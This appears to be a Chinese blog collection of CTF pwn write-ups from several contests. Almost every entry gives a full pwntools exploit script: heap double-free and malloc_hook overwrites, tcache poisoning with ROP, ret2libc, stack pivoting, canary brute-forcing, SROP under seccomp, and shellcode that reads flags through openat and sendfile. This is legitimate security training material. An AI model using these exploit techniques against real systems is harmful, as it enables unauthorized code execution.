entry.title: litctf
entry.content:
heap-2.23

2.23的libc,存在uaf漏洞和edit功能(都是一个附件，只是换了libc版本)这里选择double free改malloc_hook

from pwn import *
from LibcSearcher import *
context(os="linux", arch="i386", log_level="debug")

#p = process("./heap")
p = remote('node3.anna.nssctf.cn',28694)
elf = ELF("./heap")

def add(idx,size):
	p.recvuntil(">>")
	p.sendline("1")
	p.recvuntil("idx? ")
	p.sendline(str(idx))
	p.recvuntil("size? ")
	p.sendline(str(size))
    
def dele(idx):
	p.recvuntil(">>")
	p.sendline("2")
	p.recvuntil(b"idx? ")
	p.sendline(str(idx))
	
def edit(idx,string):
	p.recvuntil(">>")
	p.sendline("4")
	p.recvuntil("idx? ")
	p.sendline(str(idx))
	p.recvuntil("content : \n")
	p.sendline(string)
	
def show(idx):
	p.recvuntil(">>")
	p.sendline("3")
	p.recvuntil(b"idx? ")
	p.sendline(str(idx))

def exit():
	p.recvuntil("choice\n")
	p.sendline("5")
	
add(0,1060)
add(2,0x68)
add(3,0x68)
add(1,16)
dele(0)
show(0)
main = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
base = main - 3951480
onegadget = [0x4527a,0xf03a4,0xf1247]
one_gadget = base + onegadget[2]
malloc_hook = main - 88 - 0x10

print(hex(malloc_hook))
dele(2)
dele(3)
dele(2)
edit(2,p64(main - 139))
add(4,0x68)
add(5,0x68)
edit(5,b'a'*19 + p64(one_gadget))
print(hex(malloc_hook))
#gdb.attach(p)
add(7,0x10)

p.interactive()

heap-2.31

这里打exit hook

from pwn import *
from LibcSearcher import *
context(os="linux", arch="i386", log_level="debug")

#p = process("./heap")
p = remote('node3.anna.nssctf.cn',28424)
elf = ELF("./heap")

def add(idx,size):
	p.recvuntil(">>")
	p.sendline("1")
	p.recvuntil("idx? ")
	p.sendline(str(idx))
	p.recvuntil("size? ")
	p.sendline(str(size))
    
def dele(idx):
	p.recvuntil(">>")
	p.sendline("2")
	p.recvuntil(b"idx? ")
	p.sendline(str(idx))
	
def edit(idx,string):
	p.recvuntil(">>")
	p.sendline("4")
	p.recvuntil("idx? ")
	p.sendline(str(idx))
	p.recvuntil("content : \n")
	p.sendline(string)
	
def show(idx):
	p.recvuntil(">>")

	p.recvuntil(b"idx? ")

#gdb.attach(p,$rebase'0x178B')	
add(0,1060)
add(2,0x68)
add(3,0x68)
add(1,16)
dele(0)
show(0)
main = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
base = main - 2018272

ld_base = base + 2236416
print("ld_base = ",hex(ld_base))
_dl_rtld_lock_recursive = ld_base + 0xf60 + 8
_dl_rtld_unlock_recursive = _dl_rtld_lock_recursive + 8
_dl_load_lock = _dl_rtld_unlock_recursive - 0x608
__libc_atexit = base + 0x1ED608

onegadget = [0xe3afe,0xe3b01,0xe3b04]
one_gadget = base + onegadget[0]
malloc_hook = main - 88 - 0x10
print("_dl_rtld_lock_recursive = ",hex(_dl_rtld_lock_recursive))

dele(3)

edit(3,p64(_dl_rtld_lock_recursive))

add(5,0x68)
edit(5,p64(one_gadget))
print("one_gadget = ",hex(one_gadget))
#gdb.attach(p)	
print("malloc_hook = ",hex(malloc_hook))
exit()
p.interactive()

heap-2.35

该版本无法使用hook，打堆栈结合，通过p &environ泄露栈地址，直接申请ret地址会有对齐错误，这里有ptr的bss段保存着堆地址，申请到这里然后改掉指针打ROP

from pwn import *
from LibcSearcher import *
context(os="linux", arch="i386", log_level="debug")

p = process("./heap")
#p = remote('node2.anna.nssctf.cn',28077)
#elf = ELF("./heap")

def add(idx,size):
	p.recvuntil(">>")
	p.sendline("1")
	p.recvuntil("idx? ")
	p.sendline(str(idx))
	p.recvuntil("size? ")
	p.sendline(str(size))
    
def dele(idx):
	p.recvuntil(">>")
	p.sendline("2")
	p.recvuntil(b"idx? ")
	p.sendline(str(idx))
	
def edit(idx,string):
	p.recvuntil(">>")
	p.sendline("4")
	p.recvuntil("idx? ")
	p.sendline(str(idx))
	p.recvuntil("content : \n")
	p.send(string)
	
def show(idx):
	p.recvuntil(">>")
	p.sendline("3")
	p.recvuntil(b"idx? ")
	p.sendline(str(idx))

def exit():
	p.recvuntil(">>")
	p.sendline("5")
	
add(0,1060)
add(2,0x68)
add(3,0x68)
add(1,16)
dele(0)
show(0)
main = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
base = main - 2206944
env = base + 2236928
print("base = ",hex(base))
dele(2)
dele(3)
show(2)
p.recvuntil(b'content : ')
key = u64(p.recv(5).ljust(8,b'\x00'))#288
edit(3,p64(key ^ env))
print("heap = ",hex(key))
print("env = ",hex(env))
add(4,0x68)
add(5,0x68)
show(5)
stack = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - 288 - 8
print("stack = ",hex(stack))
add(6,0x78)
add(7,0x78)
dele(6)
dele(7)
edit(7,p64(key ^ stack))

add(8,0x78)
add(9,0x78)
rdi = base + 0x000000000002a3e5
ret = base + 0x0000000000029139
sys = base + 0x0000000000050D70
sh = base + 0x00000000001D8678

pay = b'a'*24

edit(9,pay)
print("stack = ",hex(stack))
show(9)
bss = u64(p.recvuntil(b'\x55')[-6:].ljust(8,b'\x00')) - 0x17a1
print("bss = ",hex(bss))
ptr = bss + 0x4060
print("ptr = ",hex(ptr))
add(10,0x58)
add(11,0x58)
dele(10)
dele(11)
edit(11,p64(key ^ (ptr + 64)))
add(12,0x58)
add(13,0x58)

edit(13,p64(0) + p64(stack - 32))
pay = b'a'*8 + p64(ret) + p64(rdi) + p64(sh) + p64(sys)
print("ptr = ",hex(ptr))
#gdb.attach(p)
edit(9,pay)

p.interactive()

ATM

ret2libc

from pwn import *
from LibcSearcher import *
context(os="linux", arch="i386", log_level="debug")

#p = process("./app")
p = remote('node1.anna.nssctf.cn',28849)
	
#
leave = 0x000000000040147c
rdi = 0x0000000000401233
bss = 0x000000000404040 + 0x800
ret = 0x000000000040101a
p.sendafter(b"password:\n",b'1')
p.sendafter(b'Exit\n',b'3')
p.sendafter(b'deposit:',b'1000')
p.sendlineafter(b'Exit\n',b'5')
p.recvuntil(b'0x')
printf = int(p.recv(12),16)
base = printf - 0x000000000060770
print("base = ",hex(base))
sys = base + 0x000000000050D60
sh = base + 0x0000000001D8698
pay = b'a'*360 + p64(rdi) + p64(sh) + p64(ret) + p64(sys)
p.send(pay)
#gdb.attach(p)
p.sendafter(b'Exit\n',b'4')

p.interactive()

entry.title: 龙CTF
entry.content:
痛失壹佰元子😭，第一次ak，出的比较简单

pwn

stack

查看程序只有一个read且溢出了0x10个字节，打栈迁移，迁移两次，一次泄露libc地址一次得到shell，由于需要再次read所以直接利用main函数

from pwn import *
from LibcSearcher import *
context(os="linux", arch="amd64", log_level="debug")

#p = process("./pwn")
p = remote("challenge.qsnctf.com",31454)
#elf = ELF("./pwn")

rdi = 0x0000000000401210
rsi_r15 = 0x0000000000401281
rbp = 0x000000000040115d
bss = 0x0000000000404000 + 0x500
puts = 0x401060
got = 0x000000000404028
leave = 0x00000000004011be

#gdb.attach(p)

payload = b'a'*0x100 + p64(bss + 0x100) + p64(0x00000000040119B)
p.sendafter("pivoting?\n",payload)

pay = p64(rdi) + p64(got) + p64(puts) + p64(rbp) + p64(bss+0x300+0x100) + p64(0x00000000040119B)
pay = pay.ljust(0x100,b'\x00') + p64(bss - 8) + p64(leave)
p.send(pay)
read_addr = u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))
print(hex(read_addr))
#base = read_addr - 0x10E1E0#0x00000000010DFC0
libc_base = read_addr - 0x00000000010DFC0
print(hex(libc_base))

#onegadget = [0xe3afe,0xe3b01,0xe3b04]
#one_gadget = libc_base + onegadget[0]

system = libc_base + 0x52290
bin_sh = libc_base + 0x1B45BD
pay3 =(b'a'*8 + p64(rdi) + p64(bin_sh) + p64(rdi+1)+p64(system)).ljust(0x100,b'\x00')
pay3 += p64(bss+0x300) + p64(leave)
p.send(pay3)

p.interactive()

canary

一直fork，有个栈溢出漏洞，由于fork出的canary不变，所以可以爆破canary，静态编译的程序，可以直接生成ropchain取得shell
相关指令：
ROPgadget --binary pwn --ropchain

from pwn import *
from LibcSearcher import *
context(os="linux", arch="amd64", log_level="debug")
local = 0
elf = ELF('./pwn')

if local:
    io = process('./pwn')
    libc = elf.libc

else:
    io = remote('challenge.qsnctf.com',31636)
  

io.recvuntil('input:\n')
canary = b'\x00'
for k in range(7):          #要爆破的字节数
    for i in range(256):
        payload = b'a'*0x108 + canary + bytes([i])  
        io.send(payload)
        data = io.recvuntil("input:\n")  #data接收的是welcome\n前的全部内容
        print(data)
        if b'stack' not in data:
            canary += bytes([i])  
            print("canary is:" + str(canary))#确保canary为字符串
            break
print("canary is:",hex(u64(canary)))
#!/usr/bin/env python3
# execve generated by ROPgadget

from struct import pack

# Padding goes here
p = b''
p += pack('<Q', 0x000000000040f23e) # pop rsi ; ret
p += pack('<Q', 0x00000000004c10e0) # @ .data
p += pack('<Q', 0x00000000004493d7) # pop rax ; ret
p += b'/bin/sh\x00'
p += pack('<Q', 0x000000000047c4e5) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x000000000040f23e) # pop rsi ; ret
p += pack('<Q', 0x00000000004c10e8) # @ .data + 8
p += pack('<Q', 0x00000000004437a0) # xor rax, rax ; ret
p += pack('<Q', 0x000000000047c4e5) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004018c2) # pop rdi ; ret
p += pack('<Q', 0x00000000004c10e0) # @ .data
p += pack('<Q', 0x000000000040f23e) # pop rsi ; ret
p += pack('<Q', 0x00000000004c10e8) # @ .data + 8
p += pack('<Q', 0x00000000004017cf) # pop rdx ; ret
p += pack('<Q', 0x00000000004c10e8) # @ .data + 8
p += pack('<Q', 0x00000000004493d7) # pop rax ; ret
p += p64(59)
p += pack('<Q', 0x00000000004012d3) # syscall
pay = b''
for i in range(len(p)):
        pay += (ord(p[i:i+1])).to_bytes(1)
#gdb.attach(io)        
payload0 = b'a'*0x108 + canary + p64(0) + pay
print(len(payload0))

io.send(payload0)
io.interactive()

srop_seccomp

开了沙盒，允许orw，有mov_rax_0xf和syscall的gadgets，所以打srop并且题目也有提示，第一次read读取了很多，栈迁移到第一次输入的bss段打srop。注意一下偏移即可

from pwn import *
from LibcSearcher import *
context(os="linux", arch="amd64", log_level="debug")

#p = process("./chall")
p = remote("challenge.qsnctf.com",31938)
elf = ELF("./chall")
mov_rax_0xf = 0x0000000000401194
bss = 0x404020 + 0x800
syscall = 0x40118a
flag = 0x404060
leave = 0x000000000040136c

#gdb.attach(p)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_open
sigframe.rdi = flag
sigframe.rsi = 0
sigframe.rdx = 0
sigframe.rsp = 0x404170
sigframe.rip = syscall

sigframe1 = SigreturnFrame()
sigframe1.rax = constants.SYS_read
sigframe1.rdi = 3
sigframe1.rsi = bss - 0x100
sigframe1.rdx = 50
sigframe1.rsp = 0x404278
sigframe1.rip = syscall

sigframe2 = SigreturnFrame()
sigframe2.rax = constants.SYS_write
sigframe2.rdi = 1
sigframe2.rsi = bss - 0x100
sigframe2.rdx = 50
sigframe2.rsp = bss + 0x10 + 256*3
sigframe2.rip = syscall

payload = b"./flag\x00\x00" + p64(0) + p64(mov_rax_0xf) + p64(syscall) + bytes(sigframe) + p64(mov_rax_0xf) + p64(syscall) + bytes(sigframe1) + p64(mov_rax_0xf) + p64(syscall) + bytes(sigframe2)
p.send(payload)

pay = b'a'*42 + p64(flag + 0x8) + p64(leave)
p.sendafter('SUID?',pay)
p.interactive()

ez_quiz

c语言伪随机+一点点re，逆向都得到token:DRKCTF{P13@s3_1e@k_thE_addr_0f_7he_cAnARy_@nd_pie}
绕过伪随机后进入gift函数，第一次格式化字符串泄露canary和程序基地址，第二次栈溢出到后门函数
利用ctypes库在python代码中调用C语言函数，步骤如下：

1.创建一个C语言源代码文件，假设名为1.c

#include <stdlib.h>
#include <time.h>
void set_seed() 
{
	time_t seed = time(0);
	srand(seed);
}
int random_number() 
{    
	return rand();
}

2.将其编译为一个动态链接库

gcc -shared -o 1.so 1.c

exp：

from pwn import *
from LibcSearcher import *
import ctypes
context(os="linux", arch="amd64", log_level="debug")

#p = process("./attachment")
p = remote("challenge.qsnctf.com",31788)
#elf = ELF("./pwn")

# 加载动态链接库
lib = ctypes.CDLL('./1.so')
lib.random_number.restype = ctypes.c_int
# 调用C语言的set_seed函数
lib.set_seed()
# 调用C语言的random_number函数
result = lib.random_number()
rand = result % 256
print(rand)

def lfsr_h(a1):
    v2 = a1 >> 1
    if (a1 & 1) == 1:
        v2 ^= 0xB8
    return v2

# 初始化
v8 = rand  # 初始值，可以根据需要更改
v12 = v11 = v10 = v9 = 0

# 主循环，进行160次迭代
for i in range(160):
    v8 = lfsr_h(v8)
    
    # 在特定的迭代次数上保存值
    if i == 156:
        v12 = v8
    if i == 157:
        v11 = v8
    if i == 158:
        v10 = v8
    if i == 159:
        v9 = v8
# 输出结果
p.sendlineafter(b'token: ',b"DRKCTF{P13@s3_1e@k_thE_addr_0f_7he_cAnARy_@nd_pie}")

print(f"v12: {v12}")
print(f"v11: {v11}")
print(f"v10: {v10}")
print(f"v9: {v9}")
x = (( v9 - v10 ) * v11 ) % v12
p.sendlineafter(b'?',str(x))

p.sendlineafter('gift:\n',b"%11$p-%13$p")
p.recvuntil("0x")
canary = int(p.recv(16)  ,16)
print("canary = ",hex(canary))
p.recvuntil("-")
backdoor = int(p.recv(16)  ,16) - 1131 - 0x1BD7 + 0x1426
print("backdoor = ",hex(backdoor))
#gdb.attach(p)
payload = b'a'*40 + p64(canary) + p64(0) + p64(backdoor)
p.send(payload)
p.interactive()

entry.title: ciscn2024
entry.content:
orange_cat_diary

2.23的libc，无限制的add和edit，show和free只有一次，并且只能对新申请的chunk进行操作，存在8字节溢堆出和uaf漏洞，题目提示打house of orange，堆覆盖到top chunk将其只保留后三位（十六进制），然后申请一个0x1000的堆，top chunk就会到unsorted bin中，可借此泄露libc地址，然后利用uaf和唯一的一次free机会修改fastbin的fd指针，申请到malloc_hook

from pwn import *
from LibcSearcher import *
context(os="linux", arch="amd64", log_level="debug")
p = process('./orange_cat_diary')
elf = ELF('./orange_cat_diary')
libc = elf.libc

def add(size,content="name"):
	p.sendlineafter("choice:", "1")
	p.sendlineafter("content:", str(size))
	p.sendafter("content:\n", content)
	
def show():
	p.sendlineafter("choice:", "2")
    	
def dele():
	p.sendlineafter("choice:", "3")

def edit(size,content):
	p.sendlineafter("choice:", "4")
	p.sendlineafter("content:", str(size))
	p.sendlineafter("content:\n", content)

p.sendafter('name.\n',b'name')

gdb.attach(p,"bp $rebase(0xEDA)")
add(0x18)
edit(32,b'a'*0x18+p64(0xfe1))
add(0x1000)
add(0x10,b'\x78')
show()
p.recvuntil('\x7f')
main_arena = u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00')) - 88
libc_base = main_arena + 88 - 3953032
print("libc_base = ",hex(libc_base))

malloc_hook = main_arena - 0x10 - 1536 - 16
print("malloc_hook = ",hex(malloc_hook))
onegadget = [0x4527a,0xf03a4,0xf1247]
one_gadget = libc_base + onegadget[1]

add(0x68)
dele()
edit(0x68,p64(malloc_hook-35))
add(0x68)
add(0x68,b'\x00'*19 + p64(one_gadget))

p.interactive()

entry.title: H&NCTF
entry.content:
close

本校新生赛出过，把输出重定向到输入秒了

exec 1>&0
cat flag

what

2.27的libc，uaf改malloc_hook

from pwn import *
from LibcSearcher import *
context(os="linux", arch="amd64", log_level="debug")

#p = process("./what")
p = remote("hnctf.imxbt.cn",29947)
elf = ELF("./what")

def add(size):
	p.recvuntil("command:\n")
	p.sendline("1")
	p.recvuntil("size:\n")
	p.sendline(str(size))
    
def dele():
	p.recvuntil("command:\n")
	p.sendline("2")

	
def edit(size,string):
	p.recvuntil("command:\n")
	p.sendline("4")
	p.recvuntil("idx:\n")
	p.sendline(str(size))
	p.recvuntil("content:\n")
	p.sendline(string)
	
def show(idx):
	p.recvuntil("command:\n")
	p.sendline("3")
	p.recvuntil(b"idx:\n")
	p.sendline(str(idx))

def exit():
	p.recvuntil("choice\n")
	p.sendline("5")
	
add(1060)#0
add(24)#1
add(24)#2
dele()
dele()
dele()
show(0)
base = u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00')) - 4111520
print("base = ",hex(base))
onegadget = [0x4f29e,0x4f2a5,0x4f302,0x10a2fc]
one_gadget = base + onegadget[3]

edit(1,p64(base+4111408))

add(24)#0
add(24)#1
edit(1,p64(one_gadget))
#gdb.attach(p)
p.recvuntil("command:\n")
p.sendline("1")
p.recvuntil("size:\n")
p.sendline(str(24))

p.interactive()

ez_pwn

32位的栈迁移，题本身不难，栈溢出一个ebp的大小，但是32位的做的题太少了，错误频出，注意两点：1."/bin/sh\x00"字符串的位置应放在调用system函数之后，不然执行函数时容易把字符串覆盖掉
2.system的plt表和system的参数之间应该有四个字节充当fake ebp

from pwn import *
from LibcSearcher import *
context(os="linux", arch="i386", log_level="debug")

flag=0
if flag==1:
	p = process("./pwn")
	gdb.attach(p)
else:
	p = remote("hnctf.imxbt.cn",50025)

pay = b'a'*44
p.sendafter("name?\n",pay)

plt = 0x8048400
sys = 0x804857B

base = u32(p.recvuntil("\xff")[-4:])
print("base = ",hex(base))

#payload =  p32(0)*4 + p32(0x8048400) + p32(0) + p32(base-28) + b'cat flag' + p32(0)*2 + p32(base-44)
payload =  p32(0)*4 + p32(0x8048400) + p32(0) + p32(base-28) + b'/bin/sh\x00' + p32(0)*2 + p32(base-44)

p.send(payload)

p.interactive()

idea

32位的ret2libc，开了canary，通过整数溢出有一个格式化字符串可以泄露canary

from pwn import *
#p = process('./pwn')
elf = ELF('./idea')
lib = ELF('./libc-2.23.so')
p = remote('hnctf.imxbt.cn', 56459)

p.recvuntil(b'?')
p.sendline(b'-1')
p.recvuntil(b'!')
p.sendline(b'%7$p')
p.recvuntil(b'0x')
canary = int(p.recv(8), 16)
p.recvuntil(b'!')
payload = b'a' * 32 + p32(canary) + p32(0) * 3 + p32(elf.plt['puts']) + p32(elf.sym['main']) + p32(elf.got['puts'])
p.sendline(payload)
base_addr = u32(p.recvuntil(b'\xf7')[-4:]) - lib.sym['puts']
print(hex(base_addr))

system = base_addr + lib.sym['system']
binsh = base_addr + next(lib.search(b'/bin/sh'))
p.recvuntil(b'?')
p.sendline(b'-1')
p.recvuntil(b'!')
p.sendline(b'%7$p')
p.recvuntil(b'!')
payload = b'a' * 32 + p32(canary) + p32(0) * 3 + p32(system) + p32(elf.sym['main']) + p32(binsh)
p.sendline(payload)

p.interactive()

entry.title: tut校赛
entry.content:
队友太强了，带我库库上分😎

ezrop

pwn签到题，ret2libc

from pwn import *
from LibcSearcher import *
context(os="linux", arch="amd64", log_level="debug")

#p = process('./ezrop')
p = remote("36.212.170.17",9997)
elf = ELF('./ezrop')

puts_plt = 0x401060
puts_got = 0x403FD8
main_addr = 0x401222
pop_rdi_ret = 0x401183
ret = 0x40101a

#gdb.attach(p)

payload = b'a'*144 + p64(0x404500) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.sendlineafter("time\n",payload)

puts_addr=u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))
print(hex(puts_addr))

libc_base = puts_addr - 0x80E50
system_addr = libc_base + 0x50D70
bin_addr = libc_base + 0x1D8678
onegadget = [0xebc81,0xebc85,0xebc88,0xebce2,0xebd38,0xebd3f,0xebd43]
one_gadget = libc_base + onegadget[5]#3 4 

print("base = ",hex(libc_base))
print("sys = ",hex(system_addr))
print("bin = ",hex(bin_addr))

#gdb.attach(p)
#pause()
pay = b'b'*144 + p64(0x404220) + p64(one_gadget) #+ p64(ret) + p64(pop_rdi_ret) + p64(bin_addr) + p64(system_addr)
p.sendlineafter("time\n",pay)

p.interactive()

orw*2

开了沙盒打orw

白给了栈地址和libc地址

查看主逻辑发现存在栈溢出，因为已知栈地址，所以可以把栈迁移到输入的内容上，还有一点就是开了canary，需要在canary的位置输入+号防止改变canary，再有就是要以double形式输入，注意flag.txt的截断问题(格式转换有点丑，轻点骂)

from pwn import *
from LibcSearcher import *
context(os="linux", arch="amd64", log_level="debug")
import struct

#p = process('./oorrww')
p = remote("36.212.170.17",9998)
elf = ELF('./oorrww')

#gdb.attach(p)
re = p.recvuntil(b'!', drop = True).split()
print("re =",re)
num11 = float(re[5])
num1 = struct.unpack('<Q', struct.pack('<d', num11))[0]
stack = int(hex(num1),16)
print("stack =",hex(stack))

binary_data = struct.pack('>Q', stack)
stack1 = struct.unpack('>d', binary_data)[0]
binary_data = struct.pack('>Q', stack+8)
stack2 = struct.unpack('>d', binary_data)[0]
binary_data = struct.pack('>Q', stack+8*13)
stack3 = struct.unpack('>d', binary_data)[0]

num22 = float(re[6])
num2 = struct.unpack('<Q', struct.pack('<d', num22))[0]
scanf = int(hex(num2),16)
base = scanf - 0x62090
print("base =",hex(base))

leave = base + 0x4da83
print("leave =",hex(leave))
binary_data = struct.pack('>Q', leave)
leave1 = struct.unpack('>d', binary_data)[0]

rdi = base + 0x2a3e5
print("rdi =",hex(rdi))
binary_data = struct.pack('>Q', rdi)
rdi1 = struct.unpack('>d', binary_data)[0]

rsi = base + 0x2be51
print("rsi =",hex(rsi))
binary_data = struct.pack('>Q', rsi)
rsi1 = struct.unpack('>d', binary_data)[0]

rdx_rcx_rbx = base + 0x108b03
print("rdx_rcx_rbx =",hex(rdx_rcx_rbx))
binary_data = struct.pack('>Q', rdx_rcx_rbx)
rdx_rcx_rbx1 = struct.unpack('>d', binary_data)[0]

ope = base + 0x1144E0
print("ope =",hex(ope))
binary_data = struct.pack('>Q', ope)
ope1 = struct.unpack('>d', binary_data)[0]

read = base + 0x1147D0
print("read =",hex(read))
binary_data = struct.pack('>Q', read)
read1 = struct.unpack('>d', binary_data)[0]

write = base + 0x114870
print("write =",hex(write))
binary_data = struct.pack('>Q', write)
write1 = struct.unpack('>d', binary_data)[0]

puts = base + 0x80E50
print("puts =",hex(puts))
binary_data = struct.pack('>Q', puts)
puts1 = struct.unpack('>d', binary_data)[0]

binary_data = struct.pack('>Q', 0)
_0 = struct.unpack('>d', binary_data)[0]
binary_data = struct.pack('>Q', 1)
_1 = struct.unpack('>d', binary_data)[0]
binary_data = struct.pack('>Q', 3)
_3 = struct.unpack('>d', binary_data)[0]
binary_data = struct.pack('>Q', 0x100)
_100 = struct.unpack('>d', binary_data)[0]
binary_data = struct.pack('>Q', stack - 0x100)
bss = struct.unpack('>d', binary_data)[0]

#orw
p.sendlineafter("input:\n",str(1.1205295609968026e+253))#bp  flag.txt
p.sendlineafter("input:\n",b"0")
p.sendlineafter("input:\n",str(rdi1))#rdi
p.sendlineafter("input:\n",str(stack3))#flag
p.sendlineafter("input:\n",str(rsi1))#rsi
p.sendlineafter("input:\n",str(_0))#0
p.sendlineafter("input:\n",str(ope1))#open
p.sendlineafter("input:\n",str(rdi1))#rdi
p.sendlineafter("input:\n",str(_3))#3
p.sendlineafter("input:\n",str(rsi1))#rsi
p.sendlineafter("input:\n",str(bss))#bss
p.sendlineafter("input:\n",str(rdx_rcx_rbx1))#rdx
p.sendlineafter("input:\n",str(_100))#0x100
p.sendlineafter("input:\n",str(1.1205295609968026e+253))#0
p.sendlineafter("input:\n",b"0")#0
p.sendlineafter("input:\n",str(read1))#read
p.sendlineafter("input:\n",str(rdi1))#rdi
p.sendlineafter("input:\n",str(_1))#1
p.sendlineafter("input:\n",str(write1))#write

p.sendlineafter("input:\n",b"+")
p.sendlineafter("input:\n",str(stack2))#stack
pause()
p.sendlineafter("input:\n",str(leave1))#leave

p.interactive()

sp

相当于xyctf的srop和inviisible_flag（禁用了orw的orw），比赛时把syscall地址给搞错了🤡，到那就挂，测！在xy的srop代码基础上稍微改改就出了（队伍的恶人）,

from pwn import *
from LibcSearcher import *
context(os="linux", arch="amd64", log_level="debug")

#p = process("./sp")
p = remote("36.212.170.17",9999)
elf = ELF("./sp")
syscall = 0x4010B0
bss = 0x404260+0x500
rdi = 0x4012ec
leave = 0x4012e2

#gdb.attach(p)
sigframe = SigreturnFrame()
sigframe.rax = 0
sigframe.rdi = 0
sigframe.rsi = 0
sigframe.rdx = bss
sigframe.rcx = 0x800
sigframe.rsp = bss + 16
sigframe.rbp = bss + 0x800
sigframe.rip = syscall

payload = b"a"*24 + p64(bss) + p64(0) + p64(rdi) + p64(0xf) + p64(syscall) + bytes(sigframe)
p.send(payload)

#pause()
flag = bss
sigframe0 = SigreturnFrame()
sigframe0.rdi = constants.SYS_openat
sigframe0.rsi = -100
sigframe0.rdx = flag
sigframe0.rcx = 0
sigframe0.rsp = bss + 0x10 + 256 + 16
sigframe0.rip = syscall

sigframe1 = SigreturnFrame()
sigframe1.rdi = constants.SYS_read
sigframe1.rsi = 3
sigframe1.rdx = bss - 0x100
sigframe1.rcx = 50
sigframe1.rsp = bss + 0x10 + 256*2 + 24 + 8
sigframe1.rip = syscall


sigframe2 = SigreturnFrame()
sigframe2.rdi = constants.SYS_sendfile
sigframe2.rsi = 1
sigframe2.rdx = 3
sigframe2.rcx = 0
sigframe2.r8 = 50
sigframe2.rsp = bss + 0x10 + 256*3
sigframe2.rip = syscall

pay = b"flag.txt" + p64(0) + p64(rdi) + p64(0xf) + p64(syscall) + bytes(sigframe0) + p64(rdi) + p64(0xf) + p64(syscall) + bytes(sigframe2) #+ p64(rdi) + p64(0xf) + p64(syscall) + bytes(sigframe2)
p.send(pay)
p.interactive()

下面是mprotect+shellcode的做法

from pwn import *
from LibcSearcher import *
context(os="linux", arch="amd64", log_level="debug")

#p = process("./sp")
p = remote("36.212.170.17",9999)
elf = ELF("./sp")

#gdb.attach(p)
pop_rdi = 0x4012ec
syscall = elf.plt['syscall']
sigframe = SigreturnFrame()
sigframe.rdi = 0
sigframe.rsi = 0
sigframe.rdx = 0x404300
sigframe.rcx = 0x300
sigframe.rbp = 0x404400
sigframe.rsp = 0x404300
sigframe.rip = syscall

payload = b'a' * 0x28 + p64(pop_rdi) + p64(0xf) + p64(syscall) + bytes(sigframe)
p.send(payload)

sigframe2 = SigreturnFrame()
sigframe2.rdi = 10
sigframe2.rsi = 0x404000
sigframe2.rdx = 0x1000
sigframe2.rcx = 7
sigframe2.rsp = 0x404410
sigframe2.rbp = 0x404500
sigframe2.rip = syscall

shellcode = shellcraft.openat(-100, 'flag.txt', 0, 0)
shellcode += shellcraft.sendfile(1, 3, 0, 50)
shellcode = asm(shellcode)

#pause()
payload = p64(pop_rdi) + p64(0xf) + p64(syscall) + bytes(sigframe2) + p64(pop_rdi) + p64(0xf) + p64(syscall) + bytes(sigframe)
p.send(payload)

#pause()
payload = p64(0x404308) + shellcode
p.send(payload)

p.interactive()

entry.title: XYCTF
entry.content:
hello_world

两次栈溢出，第一次利用字符串的截断泄露出libc地址，第二次拿到shell

from pwn import *
from LibcSearcher import *
context(os="linux", arch="amd64", log_level="debug")

p = process("./vuln")
#p = remote("xyctf.top",44777)
elf = ELF("./vuln")
libc = elf.libc

pay = b'a'*0x28
p.sendafter("name: ",pay)
gdb.attach(p)
base = u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00')) - 0x29d90
print("base = ",hex(base))
sys = base + 0x50D70
sh = base + 0x1D8678
ret = base + 0x0000000000029139
rdi = base + 0x000000000002a3e5
pay += p64(ret) + p64(rdi) + p64(sh) + p64(sys)
gdb.attach(p)
p.sendafter("please input your name: ",pay)

p.interactive()

inviisible_flag（禁用了orw的orw）



程序会执行输入的shellcode，开了沙盒禁用了execve和orw，禁用open可以用openat绕过，禁用read函数可以用pread绕过，后面禁用write我用的测信道爆破，看了wp发现sendfile64 (调用号:0x28)可以直接让一个文件描述符的内容输出到另一个文件描述符上非常适合平替这次的write函数

测信道爆破

from pwn import *
from LibcSearcher import *
context(os="linux", arch="amd64", log_level="debug")

#p = process("./vuln")
#p = remote("xyctf.top",44777)
#elf = ELF("./vuln")
#libc = elf.libc

#openat(0xffffff9c,flag,0)
#pread(3,0x114514000,0x100,0)
payload = asm('''
	mov rax, 0x67616c66
	push rax
	mov rdi, 0xffffff9c
	mov rsi,rsp
	xor rdx,rdx
	mov rax,257
	syscall
	''')
payload += asm(shellcraft.pread(3,0x114514000,0x100,0))	

def exp(dis,char):
	pay = payload	
	pay += asm('''
	mov dl, byte ptr [rsi+{}]
        mov cl, {}
        cmp cl,dl
        jz loop
        mov al,60
        syscall
        loop:
        jmp loop
	'''.format(dis,char))
	p.sendafter("again\n",pay)

flag = ""

for i in range(len(flag),50):
	sleep(1)
	print("flag : {}".format(flag))
	for j in range(0x20,0x80):
		#p = remote("xyctf.top",45966)
		p = process("./vuln")
		#gdb.attach(p)
		try:
			exp(i,j)
			p.recvline(timeout=1)
			flag += chr(j)
			print("flag : ",flag)
			log.success("{} pos : {} success".format(i,chr(j)))
			p.close()
			break
		except:           
			p.close()

sendfile绕过

from pwn import *
from LibcSearcher import *
context(os="linux", arch="amd64", log_level="debug")

p = process("./vuln")
#p = remote("xyctf.top",44777)
elf = ELF("./vuln")
libc = elf.libc

payload = asm(shellcraft.openat(0xffffff9c,b"flag",0))	
#payload = asm(shellcraft.openat(-100,b"flag",0))	
#-100 AT_FDCWD 表示当前目录
payload += asm(shellcraft.pread(3,0x114514000,0x100,0))	
payload += asm(shellcraft.sendfile(1,3,0,0x100))

p.sendafter("again\n",payload)
p.interactive()

static_link

侥幸拿了个一血😋，静态编译直接生成ropchain

from ctypes import *
from pwn import *
io = process('./vuln')
#io = remote("xyctf.top",50075)
context(log_level='debug',arch='amd64', os='linux')
elf = ELF('./vuln')


from struct import pack

# Padding goes here
p = b''

p += pack('<Q', 0x0000000000409f8e) # pop rsi ; ret
